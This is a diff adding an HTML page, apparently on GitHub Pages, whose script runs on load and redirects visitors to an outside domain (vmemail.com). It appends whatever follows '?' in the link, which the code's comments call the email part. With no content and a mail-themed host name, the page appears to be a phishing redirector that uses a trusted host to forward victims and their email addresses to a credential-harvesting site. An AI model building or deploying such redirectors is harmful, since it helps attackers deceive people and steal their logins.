@@ -1,0 +1,40 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Email Redirect</title>
+  <script>
+    function extractEmailAndRedirect() {
+      // Get the current URL
+      var currentURL = window.location.href;
+
+      // Check if the current URL contains a '?' character
+      if (currentURL.includes('?')) {
+        // Split the URL into two parts: the base URL and the email part
+        var parts = currentURL.split('?');
+        var baseURL = parts[0]; // https://mauthbox.github.io/ds/
+        var emailPart = parts[1];
+
+        // Check if the email part is not empty
+        if (emailPart) {
+          // Construct the redirect URL by appending the email to the second link
+          var redirectURL = 'https://vmemail.com/?' + emailPart;
+
+          // Redirect to the constructed URL
+          window.location.href = redirectURL;
+        } else {
+          // If the email part is empty, simply redirect to the second link
+          window.location.href = 'https://vmemail.com/';
+        }
+      } else {
+        // If no '?' character is found, simply redirect to the second link
+        window.location.href = 'https://vmemail.com/';
+      }
+    }
+
+    // Call the function immediately when the script is loaded
+    extractEmailAndRedirect();
+  </script>
+</head>
+<body>
+</body>
+</html>
